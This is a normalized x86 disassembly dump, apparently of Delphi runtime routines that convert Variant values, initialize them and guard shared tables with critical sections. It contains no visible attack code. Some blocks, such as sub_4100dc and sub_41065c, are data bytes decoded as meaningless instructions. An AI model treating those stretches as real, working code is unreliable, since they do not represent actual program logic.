mov edx [ ebp - 0x14 ]
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e9a4
retn
sub_40eff8
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f52f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f031 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404034
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403fe0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404034
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40933c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404034
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40933c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404034
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ed10
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404268
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ed48
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404268
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047d0
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048bc
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404268
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40ed80
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404268
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408004
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404034
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408004
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40eff8
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ee44
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404034
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f536
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_404004
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046d8
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_404004
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046d8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ef10
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404034
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404034
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e244
test ah 0x40
je r-xdata
mov eax esi
call sub_403fe0
mov edx eax
mov eax ebx
call sub_40ef74
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ee44
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_404034
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ee44
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404034
jmp r-xdata
jmp [ eax * 4 + jump_table_40f2c5 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40933c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40933c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ed10
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404268
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ed48
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404268
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404208
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ed80
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404268
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404034
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408004
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408004
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404034
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40eff8
jmp r-xdata
sub_40f53c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f5e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5c9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e684
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047d0
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5d0
lea eax [ ebp - 0x10 ]
call sub_40e9a4
retn
sub_40f5f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f64a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eccc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f651
lea eax [ ebp - 0x10 ]
call sub_40e9a4
retn
sub_40f658
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f710
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410390
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f717
lea eax [ ebp - 0x20 ]
call sub_4046c0
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f6f3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047d0
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e9a4
retn
sub_40f720
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fc72
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f75a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40480c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4046c0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40480c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40933c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40480c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40933c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40480c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ed10
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046fc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ed48
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046fc
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047d0
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048bc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ed80
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046fc
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407f18
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408004
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40480c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408004
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f720
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f53c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fc79
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046d8
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_404004
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046d8
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_404004
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046d8
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_404004
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046d8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f5f4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046fc
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40480c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e244
test ah 0x40
je r-xdata
mov eax esi
call sub_4046c0
mov edx eax
mov eax ebx
call sub_40f658
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f53c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046fc
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f53c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046fc
jmp r-xdata
jmp [ eax * 4 + jump_table_40f9e1 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40933c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40933c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ed10
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ed48
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046fc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047d0
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ed80
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046fc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40480c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f18
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408004
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408004
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40480c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f720
jmp r-xdata
sub_40fc80
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e928
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fcbc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e928
sub_40fce8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e928
sub_40fd4c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404034
pop esi
pop ebx
retn
mov eax ebx
call sub_40e928
sub_40fd78
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4048bc
pop esi
pop ebx
retn
mov eax ebx
call sub_40e928
sub_40ff34
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41005a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_404034
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410390
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042ec
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40802c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042ec
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404244
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410061
lea eax [ ebp - 0x208 ]
call sub_403fe0
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042ec
sub_4100dc
inc [ ebx * 8 + 0x56080040 ]
popad
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410390
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410310
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4100ec
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41014d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404dd8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410154
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403290
sub_41019c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410310
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410390
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4101f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_410228
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410310
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410264
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40361c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4102c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102ce
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410368
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410390
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410438
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404dd8
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_410448
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41051e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410501
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404de0
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410508
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404244
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407ce4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410538
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4105a7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105ae
retn
call sub_4100ec
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fa0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a68
mov eax rw-data
call sub_403fe0
mov eax rw-data
call sub_40e9b8
sub_4105b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410651
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410658
retn
mov eax rw-data
call sub_4100bc
mov eax sub_40e6b8
mov [ rw-data ] eax
mov eax sub_40e2e0
mov [ rw-data ] eax
mov edx sub_40e1f0
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e9b8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fdb0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eccc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eff8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f720
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_41065c
inc esi
inc edi
add [ ebx + 0x640000ff ] ch
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] ch
inc edi
add [ ebp + 0x640000ff ] ch
inc esi
inc edi
add [ esi + 0x640000ff ] ch
inc esi
inc edi
add [ edi + 0x640000ff ] ch
inc esi
inc edi
add [ eax + 0x640000ff ] dl
inc esi
inc edi
add [ ecx + 0x640000ff ] dl
inc esi
inc edi
add [ edx + 0x640000ff ] dl
inc esi
inc edi
add [ ebx + 0x640000ff ] dl
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
inc esi
inc edi
add [ esi + 0x640000ff ] dl
inc esi
inc edi
add [ edi + 0x640000ff ] dl
inc esi
inc edi
